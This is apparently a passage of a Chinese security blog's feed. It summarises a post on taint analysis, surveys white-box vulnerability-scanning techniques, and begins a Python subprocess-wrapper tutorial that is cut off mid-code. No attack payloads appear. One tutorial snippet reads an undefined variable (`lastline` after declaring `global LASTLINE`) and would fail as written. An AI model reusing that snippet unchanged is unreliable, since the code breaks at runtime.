      &lt;p&gt;&lt;strong&gt;本文首次发表在&lt;a href=&quot;https://www.toutiao.com/i6826913540683596300/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;慕测头条公众号&lt;/a&gt;，这里只作归档用&lt;/strong&gt;&lt;/p&gt;&lt;h1 id=&quot;背景意义&quot;&gt;&lt;a href=&quot;#背景意义&quot; class=&quot;headerlink&quot; title=&quot;背景意义&quot;&gt;&lt;/a&gt;背景意义&lt;/h1&gt;&lt;p&gt;随着人们对软件安全的不断重视，静态安全扫描系统被部署于开发流程。相对于其他传统分析方法，污点分析技术由于具有较高的可解释性和准确性，目前作为挖掘 Web 漏洞的常用技术，广泛应用于开源和商用扫描器中。&lt;/p&gt;&lt;p&gt;然而，污点分析方法存在种种不足。首先，污点分析无法处理容器类型，静态污点分析只能将容器变量（如Map、List变量）的传播规则设为传播/不传播污点，造成过污染/欠污染；其次，污点分析无法处理控制流，污点分析并不能识别用于检查数据是否合法的分支语句，导致误报；最后，污点分析无法处理特殊的传播条件，如SSRF漏洞要求攻击者能操纵域名，若污点拼接在URL参数部分，则代码不存在漏洞，而污点分析仍会报告漏洞。为解决这些问题，目前安全工程师只有手动设计精巧的规则，可即使这样仍会产生大量误报甚至漏报。&lt;/p&gt;
    
    </summary>
    
      <category term="源码安全" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="机器学习" scheme="http://anemone.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="白盒扫描" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>白盒扫描技术综述</title>
    <link href="http://anemone.top/whitebox-%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/"/>
    <id>http://anemone.top/whitebox-白盒扫描技术综述/</id>
    <published>2020-05-28T11:27:37.000Z</published>
    <updated>2020-05-31T10:02:42.114Z</updated>
    
    <content type="html"><![CDATA[<p>写毕设调查背景知识时做的，在<a href="https://www.t00ls.net/thread-56572-1-1.html" target="_blank" rel="noopener">t00ls</a>和<a href="https://forum.90sec.com/t/topic/1087" target="_blank" rel="noopener">90sec</a>发过帖子，这里做归档用。</p><h1 id="词法分析技术"><a href="#词法分析技术" class="headerlink" title="词法分析技术"></a>词法分析技术</h1><p>词法分析技术是最简单的一类漏洞挖掘技术，其主要思想是将代码文本与归纳好的缺陷模式进行匹配，以此发现漏洞。由于其不深入分析程序结构和语义，往往只能挖掘较为简单的一类漏洞，并且存在相当高的误报率，在实际场景下应用较少，但由于其思想简单，适用性很广，目前也还存在类似工具，如：<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" target="_blank" rel="noopener">MobSF</a>，<a href="https://github.com/WhaleShark-Team/cobra" target="_blank" rel="noopener">Cobra</a>。</p><a id="more"></a><h1 id="形式化方法分析技术"><a href="#形式化方法分析技术" class="headerlink" title="形式化方法分析技术"></a>形式化方法分析技术</h1><p>形式化方法分析主要思想是将软件代码性质进行形式化描述，再判断该描述是否满足漏洞特征的一类分析方法[1]，其中定理证明技术是形式化代码分析技术的主要代表。</p><p>定理证明技术将漏洞存在（或不存在）定义为一定理，再将源程序代码特征转化为数学表达形式，最后对数学表达进行逻辑推理，若定理存在性得以证明，则漏洞存在（或不存在），即漏洞挖掘过程类似于数学上的定理证明过程。主要代表性工具有 <a href="https://fbinfer.com/" target="_blank" rel="noopener">infer</a>、 ESC/Java[2] 和 saturn[3]。</p><p>该技术作为一种使用严格数理逻辑推理作为检测手段的技术，误报率较低，但由于其需要针对特定漏洞构建数学条件，需要大量人工参与，有的漏洞甚至难以用数学结构表达，目前只适用于死循环、资源泄露和空指针等问题，对新漏洞的扩展性不高，同时，如何将大规模程序应用于形式化方法分析也成为工业界亟待解决的问题。 </p><p>对于形式化分析技术本人也不是很了解，想要进一步了解的建议看下论文[1]和<a href="https://github.com/leanprover/lean2" target="_blank" rel="noopener">lean2</a>。</p><h1 id="符号执行技术"><a href="#符号执行技术" class="headerlink" title="符号执行技术"></a>符号执行技术</h1><p>符号执行技术是一种将程序执行可达性问题转化为约束求解问题，并以此进行漏洞挖掘的技术[4]，代表性工具有<a href="http://angr.io/" target="_blank" rel="noopener">angr</a>，DART[5], CUTE[6], EXE[7]和KLEE[8]。</p><p>具体来说，符号执行包含一个符号状态表$\sigma$和一个符号路径约束 $PC$ ，开始时， $\sigma=\varnothing, PC=true$ ，每读取一条语句，就将变量抽象为约束求解中的变量、常量或他们的表达式放入 $\sigma$ 中，特别的，当遇到条件判断 $if(e)$ 时，将if分支的 $PC$ 更新为 $PC \wedge \sigma(e)$ ，将else分支的 $PC’$ 更新为 $PC\wedge \neg\sigma(e)$ ，随后使用约束求解器求解 $PC$ 和 $PC’$ ，如果约束不满足，则停止对该分支的解析（因为该分支不可达）。当符号执行遇到程序崩溃、预先定义的漏洞语句、或是程序正常退出时，整个分析停止，同时可以计算可以到达停止点的输入。</p><p>符号执行可以分析程序中的控制流、覆盖更多代码，同时也有效降低了误报率，但传统符号执行严重依赖于约束求解器的能力，例如，若约束求解器不能处理非线性计算，或是整个程序中存在无法分析的第三方库，那么整个分析将无法继续。为解决这些问题，研究者们提出了动态符号执行的想法[5,6,7,8]，但其在实际应用中仍不是很广泛，主要原因在于其需要大量计算资源，甚至在处理大规模程序时，出现的路径爆炸问题会导致约束求解无法产生结果。</p><p>符号执行技术是目前工业界和企业界都在研究的热门领域，这里推荐英语好的朋友看下<a href="https://www.youtube.com/watch?v=mffhPgsl8Ws" target="_blank" rel="noopener">此视频</a>和符号执行的经典文章“Symbolic Execution for Software Testing: Three Decades Later”[4]，英语不好的朋友推荐一下这<a href="https://wcventure.github.io/" target="_blank" rel="noopener">wcventure</a>大佬总结的<a href="https://blog.csdn.net/wcventure" target="_blank" rel="noopener">这篇文章</a>。</p><h1 id="数据流和控制流分析技术"><a href="#数据流和控制流分析技术" class="headerlink" title="数据流和控制流分析技术"></a>数据流和控制流分析技术</h1><p>数据流分析是一种按程序执行路径模拟数据流动的一种分析技术，其原本用于进行程序优化[9]，安全研究者们发现后将其运用于漏洞挖掘中，如今该技术在白盒，灰盒和黑盒测试都有应用[10]。</p><p>在数据流分析过程中，存在<strong>过程内分析</strong>和<strong>过程间分析</strong>，过程内分析主要对函数内分析，而过程间分析主要处理跨函数分析。</p><ul><li><p>对于过程内分析，根据其对程序路径的分析精度，可分为流不敏感分析，流敏感分析和路径敏感分析。流不敏感的数据流分析只是按代码行号从上而下进行分析；流敏感分析会首先产生程序控制流图（CFG, Control Flow Graph），再按照CFG的拓扑排序正向或逆向分析；路径敏感信息不仅考虑到语句先后顺序，还会考虑语句可达性，即会沿实际可执行到路径进行分析。</p></li><li><p>过程间分析，首先构造程序的调用图（CG, Call Graph），接着遍历图中函数进行过程内分析，当遇到其他函数时，若已分析过，则直接使用分析结果向下分析，若未分析过，则跟进该函数，再次进行过程内分析，并且将分析结果保存。</p></li></ul><p>数据流分析能够一定程度上理解程序语义，是一种比词法分析技术更为精确的一类分析技术，其关键在于准确计算程序的数据流。</p><h1 id="污点分析技术"><a href="#污点分析技术" class="headerlink" title="污点分析技术"></a>污点分析技术</h1><p>污点分析属于数据流分析的变种，通过判断关键操作的数据（如调用危险函数的参数）是否可被用户操控，推测程序是否存在安全性漏洞。由于其了解程序上下文，并且有较强的可解释性——安全工程师可以通过跟踪污点传播过程判断是否存在安全问题，因此其也成为了挖掘 Web 或 Android 漏洞较为常用的技术，也被很多开源或商用白盒扫描器使用，如：Pixy[11]、Find Security Bugs、<a href="https://www.microfocus.com/en-us/solutions/application-security" target="_blank" rel="noopener">Fortify</a>和<a href="https://lgtm.com/" target="_blank" rel="noopener">LGTM</a>。</p><h2 id="三要素"><a href="#三要素" class="headerlink" title="三要素"></a>三要素</h2><p>污点分析主要有三个组成要素：污点信息产生点（source）、污点信息汇聚点（sink）和污点信息清洁点（sanitizer），它们通常需要富有经验的安全工程师手动设置。</p><ul><li>产生点（source）：污点产生点往往是用户输入的数据，比如Web应用中读取URL参数的函数，顾名思义，这些函数调用后的返回值被标记为污点——攻击者可以操控的数据点。</li><li>汇聚点（sink）：检查点是程序的一些敏感操作，如调用数据库查询语句，或是将数据返回到网页，如果这些操作的数据是污点，那么意味着操作可被攻击者利用，即程序存在漏洞。</li><li>清洁点（sanitizer）：清洁点通常是对污点进行消除的一类操作，如SQL注入、XSS中的过滤函数。清洁点是污点传播准确性的重要保证，不能识别清洁点即会引发污点过污染问题。</li></ul><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>污点分析分为静态污点分析和动态污点分析，两者区别在于静态污点分析只使用程序代码模拟污点传播过程，而动态污点传播则通过程序的实际运行进行传播，由于本文关注于白盒测试情景，故只介绍静态污点传播方法，而在下一子章节会介绍动态传播的优劣势。</p><p>在定义好三要素之后，污点分析法会与数据流分析一样，对程序进行过程内分析和过程间分析。</p><p>过程内分析包括了显式流分析和隐式流分析，显示流分析即通过分析变量的数据依赖关系进行污点传播，而隐式分析则是指考虑控制依赖进行污点传播。</p><p><img src="/whitebox-白盒扫描技术综述/image-20200528204252182.png" alt="image-20200528204252182"></p><p>如上图所示，首先假设变量 $a$ 为污点变量，实线箭头表示了显示污点传播路径，而虚线箭头表示了隐式污点传播路径，同时该图也说明了过程内污点传播基本思想，即从上至下遍历数据流图，若未标记的变量依赖于污点变量，则新变量也被标记为污点变量。虽然攻击者确实可以利用控制依赖操作数据进行攻击，但由于其分析复杂且会产生大量误报，在工程领域常常只做数据流依赖的显示分析，因此本文主要讨论显式流分析。</p><p>现代程序存在着复杂的函数调用，除了进行过程内分析，还需要进行过程间分析。其分析首先构造函数调用图（Call Graph），接着搜索存在产生点的函数，对于每一个存在产生点的函数，自顶向下分析（也可以自底向上分析）。遇到函数调用时，跟进被调函数，进行过程内污点分析，将分析结果表达为 $\left\langle f, S, r\right\rangle$ 的函数摘要，其中$f$包含函数本身摘要信息（类名方法名和函数签名），$S$ 指调用过该函数后被污染的变量集合，$r$ 取值0或1，标记函数返回值是否被污染；接着根据函数摘要，再进行过程内分析，如此往复直至分析完函数所有代码块或是污点传播至汇聚点，报告漏洞。</p><p><img src="/whitebox-白盒扫描技术综述/image-20200528204328041.png" alt="image-20200528204328041"></p><p>如上图所示，分析过程从左侧函数开始，因为其找到了一处产生点——<em>request.getParameter(“xss”)</em>，于是将污点传递到变量<em>p</em>，接着调用函数<em>func(p)</em>，于是对函数<em>func()</em>做过程内分析，得到其函数摘要， $\left\langle func, \left\{a, b, c\right\}, 1\right\rangle$ ，于是回到调用者的函数内，变量<em>q</em>被标记为污点，又因为第三行存在一处汇聚点——<em>response.getpriter.print()</em>，并且参数为污点，于是报告此处有漏洞，并且根据汇聚点可以判断该漏洞是一个 XSS 漏洞。</p><h2 id="优势和不足"><a href="#优势和不足" class="headerlink" title="优势和不足"></a>优势和不足</h2><p>污点分析能够对程序上下文有一定理解，往往能产生误报率相对较低以及可解释的漏洞报告，其方法对 Web 类型的安全漏洞覆盖率较高，而污点类型的漏洞普遍具有较高危害性，因此该方法已被很多工业界、学术界的安全静态扫描工具所使用。</p><p>然而，污点传播仍有可能发生误报，以下通过简单示例来说明。</p><p><img src="/whitebox-白盒扫描技术综述/image-20200530195755514.png" alt="image-20200530195755514"></p><p>首先，污点传播对容器类型无法做很好处理，如上图 (a)所示，当污点传入 容器类型时（在此例子中为 map），静态污点传播只能将这类变量的传播规则设 为传播/不传播污点，从而造成过污染/欠污染，就如图所示，若设为 map 传播污点，由于案例实际从容器中取出的是没有污点的变量，即过污染，而若设为不传播，若 q 取出参数 p，那么又导致欠污染。动态污点传播虽然解决了这一问题， 但是由于其使用条件复杂，且无法用于静态分析，本文暂不讨论。</p><p>此外，不论是动态污点传播还是静态污点传播，其对污点清洁点的识别能力几乎为零，如上图(b)所示，该函数是一个典型的防御 SQL 注入的污点清洁 函数，即在第 2∼5 行对待拼接 SQL 字符串存在的特殊字符进行替换和过滤，但 是污点传播并不能识别这些清洁函数，导致误报。</p><p>再者，静态污点传播对控制流没法做很好的处理，如上图(c)所示，在第三行，程序已经对可能产生的 SSRF 漏洞进行了处理，即如果是内部地址则直接返回，但是不论是考虑显式流还是隐式流，污点传播都不能避免这一类误报。</p><p>最后，对于特殊触发条件的漏洞，污点传播无法很好处理，如上图(d)所示， 在第二行，因为 SSRF 要求攻击者能够操控主机名，所以即使用户输入的污点变量拼接在一个正常主机名之后，程序也不会出现 SSRF ，而按照污点传播分析法，毫无疑问它会报告这段程序存在 SSRF 漏洞。</p><p>这些问题也是工业界和学术界亟待解决的问题，如工业界开始尝试用符号执行，以及用黑盒、IAST配合解决白盒，在学术界也正尝试用机器学习解决问题。</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol><li>J. M. Schumann, Automated Theorem Proving in Software Engineering, Springer Berlin Heidelberg, Berlin, Heidelberg, 2001.</li><li>C. Flanagan, K. R. M. Leino, M. Lillibridge, G. Nelson, J. B. Saxe, R. Stata, Extended static checking for Java, in: Proceedings of the 2002 ACM SIGPLAN Conference on Programming Language Design and Implementation, Vol. 48, ACM Press, New York, New York, USA, 2002, pp. 234–245.</li><li>Y. Xie, A. Aiken, Saturn: A scalable framework for error detection using Boolean satisfiability, ACM Transactions on Programming Languages and Systems 29 (3) (2007) 16</li><li>C. Cadar, K. Sen, Symbolic Execution for Software Testing: Three Decades Later, Communications of the ACM 56 (2) (2013) 82–90.</li><li>P. Godefroid, N. Klarlund, K. Sen, DART: directed automated random testing, in: Proceedings of the 2005 ACM SIGPLAN conference on Programming language design and implementation, Vol. 40, ACM Press, New York, New York, USA, 2005, pp. 213–223.</li><li>K. Sen, D. Marinov, G. Agha, CUTE: a concolic unit testing engine for C, Proceedings of the 10th European software engineering conference held jointly with 13th ACM SIGSOFT international symposium on Foundations of software engineering 30 (5) (2005) 263.</li><li>C. Cadar, V. Ganesh, P. M. Pawlowski, D. L. Dill, D. R. Engler, EXE: Automatically Generating Inputs of Death, ACM Transactions on Information and System Security 12 (2) (2008) 1–38.</li><li>C. Cadar, D. Dunbar, D. Engler, Klee: Unassisted and automatic generation of high­coverage tests for complex systems programs, in: Proceedings of the 8th USENIX Symposium on Operating Systems Design and Implementation, OSDI 2008, Vol. 8, 2019, pp. 209–224</li><li>G. A. Kildall, A unified approach to global program optimization, in: Proceedings of the 1st annual ACM SIGACT SIGPLAN symposium on Principles of programming languages, ACM Press, New York, New York, USA, 1973, pp. 194–206.</li><li>B. Shastry, F. Yamaguchi, K. Rieck, J. P. Seifert, Towards Vulnerability Discovery Using Staged Program Analysis, in: Detection of Intrusions and Malware, and Vulnerability Assessment, Springer, Cham, 2016, pp. 78–97.</li><li>N. Jovanovic, C. Kruegel, E. Kirda, Pixy: a static analysis tool for detecting Web application vulnerabilities, in: Proceedings of the 2006 IEEE Symposium on Security and Privacy, IEEE, 2006, pp. 258–263.</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;写毕设调查背景知识时做的，在&lt;a href=&quot;https://www.t00ls.net/thread-56572-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;t00ls&lt;/a&gt;和&lt;a href=&quot;https://forum.90sec.com/t/topic/1087&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;90sec&lt;/a&gt;发过帖子，这里做归档用。&lt;/p&gt;&lt;h1 id=&quot;词法分析技术&quot;&gt;&lt;a href=&quot;#词法分析技术&quot; class=&quot;headerlink&quot; title=&quot;词法分析技术&quot;&gt;&lt;/a&gt;词法分析技术&lt;/h1&gt;&lt;p&gt;词法分析技术是最简单的一类漏洞挖掘技术，其主要思想是将代码文本与归纳好的缺陷模式进行匹配，以此发现漏洞。由于其不深入分析程序结构和语义，往往只能挖掘较为简单的一类漏洞，并且存在相当高的误报率，在实际场景下应用较少，但由于其思想简单，适用性很广，目前也还存在类似工具，如：&lt;a href=&quot;https://github.com/MobSF/Mobile-Security-Framework-MobSF&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;MobSF&lt;/a&gt;，&lt;a href=&quot;https://github.com/WhaleShark-Team/cobra&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Cobra&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="源码安全" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="白盒扫描" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="污点分析" scheme="http://anemone.top/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
      <category term="数据流分析" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
      <category term="符号执行" scheme="http://anemone.top/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
      <category term="形式化分析" scheme="http://anemone.top/tags/%E5%BD%A2%E5%BC%8F%E5%8C%96%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>使用Python优雅调用其他工具或命令</title>
    <link href="http://anemone.top/dev-%E4%BD%BF%E7%94%A8Python%E4%BC%98%E9%9B%85%E8%B0%83%E7%94%A8%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E6%88%96%E5%91%BD%E4%BB%A4/"/>
    <id>http://anemone.top/dev-使用Python优雅调用其他工具或命令/</id>
    <published>2020-03-02T07:32:03.000Z</published>
    <updated>2020-03-21T07:51:07.862Z</updated>
    
    <content type="html"><![CDATA[<p>Python 开发扫描器时往往会调用其他第三方工具，但是通过 <code>os.system()</code>或者其他命令中是会有这样或那样的坑或不足，本文对这些问题进行总结并提出解决方案，并在结尾给出了一个封装好的类，能较为完美的解决Python调用第三方命令的问题。</p><h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><ol><li>首先，我可以调用任意命令，并且可以在命令执行时向输入通道（stdin）传更多输入，同时Python能实时获取输出通道（stdout）和错误通道（stderr）获程序输出，注意是获取输出，而不是单纯的将输出重定向到屏幕或文件中；</li><li>我可以通过返回值，或者程序输出判断第三方程序执行是否出错，如果出错抛出异常或者进行异常处理；</li><li>执行命令是最好可以设置超时时间，防止子命令假死而影响主程序；</li><li>这段调用程序应该是跨平台的，毕竟Python本身就是跨平台语言。</li></ol><a id="more"></a><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>看到第一条和第二条需求，首先想到用 <code>subprocess.Popen()</code> 可以实现，确实，我们可以基于它进行改造，完成我们的任务。</p><p><code>subprocess.communicate()</code> 虽然可以让 Python 拿到程序返回到stdout或stderr的输出，但是它不是实时的，要想做到实时输出，首先将stdout和stderr通道重定向到<code>subprocess.PIPE</code>，这里方便起见，我先将stderr通道重定向到stdout，再将stdout重定向到<code>subprocess.PIPE</code>，注意如果是Windows平台，直接传命令是没法拿到正确的程序返回值的，因此要在后面加上<code>&amp; exit</code> 命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> platform.architecture()[<span class="number">-1</span>] == <span class="string">"ELF"</span>:</span><br><span class="line">    cmd = cmd</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cmd = cmd + <span class="string">" &amp; exit"</span></span><br><span class="line">process = subprocess.Popen(cmd, shell=<span class="literal">True</span>, bufsize=<span class="number">1024</span>, stdout=subprocess.PIPE,</span><br><span class="line">                                        stderr=subprocess.STDOUT)</span><br></pre></td></tr></table></figure><p>下面考虑如何从process中拿数据的问题，这里一定要新开一个线程取数据，否则可能会出现子命令执行产生大量输出填满了subprocess的缓冲区，导致整个程序阻塞的问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">log_thread = threading.Thread(target=print_log, args=(process.stdout,))</span><br><span class="line">log_thread.start()</span><br></pre></td></tr></table></figure><p>以上的 <code>print_log(stdout)</code>函数用来不断向输出缓冲区取数据，并进行其他处理，这里的stdout相当于一个文件句柄，但是实践表明不能用 readline() 和readlines() 读数据，因为第三方程序输出有可能会用<code>\r</code>在同一行上多次打印输出（如在命令行显示进度条的及情况），用<code>readlines()</code>更会造成程序运行效率慢的问题（谁也不想一个日志处理环节把一个核心的CPU打满吧？），因此读取日志的函数应该这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LASTLINE=<span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">( stdout)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> log_line <span class="keyword">in</span> _log_line_iter(stdout):</span><br><span class="line">        process_line(log_line)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_log_line_iter</span><span class="params">(reader)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> LASTLINE</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        buf = reader.read(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> buf:</span><br><span class="line">            <span class="keyword">if</span> platform.architecture()[<span class="number">-1</span>] == <span class="string">"ELF"</span>:</span><br><span class="line">                lines = buf.decode(<span class="string">'utf8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lines = buf.decode(<span class="string">'gbk'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">            lines = lines.replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>).replace(<span class="string">'\r'</span>, <span class="string">'\n'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            lines[<span class="number">0</span>] = lastline + lines[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> lines[:<span class="number">-1</span>]:</span><br><span class="line">                <span class="keyword">if</span> len(line) &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">yield</span> line</span><br><span class="line">            lastline = lines[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里用 <code>read()</code>函数从缓冲区拿数据，并且通过 <code>process_line(log_line)</code> 进行处理，这个函数就是我们可以自定的函数了，该打日志打日志，该保存保存。</p><p>接下来就是如何进行超时处理的，这里subprocess的<code>wait(timeout)</code>已经具有了超时功能，这里我们只要注意超时后将子进程杀死即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(proc_pid)</span>:</span></span><br><span class="line">    process = psutil.Process(proc_pid)</span><br><span class="line">    <span class="keyword">for</span> proc <span class="keyword">in</span> process.children(recursive=<span class="literal">True</span>):</span><br><span class="line">        proc.kill()</span><br><span class="line">    process.kill()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    process.wait(timeout=timeout)</span><br><span class="line"><span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    kill(process.pid)</span><br><span class="line">    log_thread.join()</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure><p>注意杀死进程后，还是需要将程序最后输出获取完，再结束日志进程。</p><p>最后可以通过日志和程序返回值<code>process.returncode</code>获取程序执行情况。</p><h1 id="封装类"><a href="#封装类" class="headerlink" title="封装类"></a>封装类</h1><p>根据以上实现，本人封装了一个较为方便的超类，用的时候只需要继承这个类，再自定义打印日志和命令执行我能的回调函数即可（在回调函数中可以做异常处理）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> psutil</span><br><span class="line">OS_LINUX = <span class="string">"ELF"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(proc_pid)</span>:</span></span><br><span class="line">    process = psutil.Process(proc_pid)</span><br><span class="line">    <span class="keyword">for</span> proc <span class="keyword">in</span> process.children(recursive=<span class="literal">True</span>):</span><br><span class="line">        proc.kill()</span><br><span class="line">    process.kill()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandRunner</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, output_size: int = <span class="number">500</span>)</span>:</span></span><br><span class="line">        self.log_size = output_size</span><br><span class="line">        self.output = list()</span><br><span class="line">        self.lastline = <span class="string">''</span></span><br><span class="line">        self.cmd = <span class="literal">None</span></span><br><span class="line">        _, os = platform.architecture()</span><br><span class="line">        self.os = OS_LINUX <span class="keyword">if</span> <span class="keyword">not</span> os <span class="keyword">else</span> os</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(self, log_line)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span><span class="params">(self, cmd: str, timeout: int = <span class="number">-1</span>)</span> -&gt; int:</span></span><br><span class="line">        logging.info(<span class="string">"Running cmd: \"&#123;&#125;\""</span>.format(cmd))</span><br><span class="line">        <span class="keyword">if</span> self.os == OS_LINUX:</span><br><span class="line">            self.cmd = cmd</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.cmd = cmd + <span class="string">" &amp; exit"</span></span><br><span class="line">        self.process = subprocess.Popen(self.cmd, shell=<span class="literal">True</span>, bufsize=<span class="number">1024</span>, stdout=subprocess.PIPE,</span><br><span class="line">                                        stderr=subprocess.STDOUT)</span><br><span class="line">        log_thread = threading.Thread(target=self.print_log, args=(self.process.stdout,))</span><br><span class="line">        log_thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> timeout &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.process.wait(timeout=timeout)</span><br><span class="line">            <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">                kill(self.process.pid)</span><br><span class="line">                log_thread.join()</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.process.wait()</span><br><span class="line">        log_thread.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.callback()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(self, stdout)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> log_line <span 